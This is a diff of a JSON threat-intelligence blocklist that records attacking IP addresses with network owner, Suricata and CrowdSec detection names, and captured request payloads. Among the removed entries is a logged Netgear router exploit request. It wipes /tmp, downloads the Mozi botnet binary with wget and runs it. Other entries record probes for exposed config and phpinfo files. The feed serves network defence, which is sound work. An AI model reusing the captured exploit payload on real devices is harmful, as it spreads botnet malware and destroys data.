@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-09-12T01:00:00Z",
+  "generated_at": "2026-09-12T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
@@ -8,103 +8,6 @@
     "v6": 0
   },
   "items": [
-    {
-      "ip": "94.243.15.239",
-      "family": "v4",
-      "first_seen": "2026-09-05T08:00:00Z",
-      "last_seen": "2026-09-05T08:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "8359",
-      "asn_name": "MTS MTS PJSC",
-      "asn_prefix": "94.243.8.0/21",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "34.88.87.47",
-      "family": "v4",
-      "first_seen": "2026-09-05T07:00:00Z",
-      "last_seen": "2026-09-05T07:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER Tilde in URI - potential .php~ source disclosure vulnerability"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.88.80.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /wp-config.php~"
-      ]
-    },
-    {
-      "ip": "161.118.214.107",
-      "family": "v4",
-      "first_seen": "2026-09-05T05:00:00Z",
-      "last_seen": "2026-09-05T05:00:00Z",
-      "scenarios": [
-        "suricata/ET WEB_SERVER WEB-PHP phpinfo access"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "31898",
-      "asn_name": "ORACLE-BMC-31898 - Oracle Corporation",
-      "asn_prefix": "161.118.192.0/18",
-      "payloads": [
-        "GET /phpinfo.php"
-      ]
-    },
-    {
-      "ip": "146.190.119.114",
-      "family": "v4",
-      "first_seen": "2026-09-05T01:00:00Z",
-      "last_seen": "2026-09-05T01:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "146.190.112.0/20",
-      "payloads": [
-        "GET /"
-      ]
-    },
-    {
-      "ip": "35.203.211.240",
-      "family": "v4",
-      "first_seen": "2026-09-05T01:00:00Z",
-      "last_seen": "2026-09-05T01:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA SMB malformed request dialects"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "35.203.211.0/24",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ]
-    },
     {
       "ip": "136.119.4.166",
       "family": "v4",
@@ -1476,6 +1379,99 @@
       "payloads": [
         "\u00033.\\xe0Cookie: mstshash=Administrator"
       ]
+    },
+    {
+      "ip": "139.59.129.234",
+      "family": "v4",
+      "first_seen": "2026-09-12T07:00:00Z",
+      "last_seen": "2026-09-12T07:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "139.59.128.0/19"
+    },
+    {
+      "ip": "85.217.149.30",
+      "family": "v4",
+      "first_seen": "2026-09-12T04:00:00Z",
+      "last_seen": "2026-09-12T04:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "209334",
+      "asn_name": "MODAT-01 Modat B.V.",
+      "asn_prefix": "85.217.149.0/24",
+      "tags": [
+        "mwl:scanner=\"modat\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "172.69.222.153",
+      "family": "v4",
+      "first_seen": "2026-09-12T03:00:00Z",
+      "last_seen": "2026-09-12T03:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "13335",
+      "asn_name": "CLOUDFLARENET - Cloudflare",
+      "asn_prefix": "172.69.222.0/24",
+      "tags": [
+        "mwl:cdn=\"cloudflare\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "162.158.243.171",
+      "family": "v4",
+      "first_seen": "2026-09-12T03:00:00Z",
+      "last_seen": "2026-09-12T03:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER Next.js Middleware Authorization Bypass (CVE-2025-29927)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "13335",
+      "asn_name": "CLOUDFLARENET - Cloudflare",
+      "asn_prefix": "162.158.240.0/22",
+      "tags": [
+        "mwl:cdn=\"cloudflare\""
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "45.225.91.89",
+      "family": "v4",
+      "first_seen": "2026-09-12T01:00:00Z",
+      "last_seen": "2026-09-12T01:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA SSH invalid banner"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "271936",
+      "asn_name": "AS271936 - SERVICIOS DE TELECOMUNICACIONES ATVCABLE CIA. LTDA.",
+      "asn_prefix": "45.225.91.0/24"
     }
   ]
 }
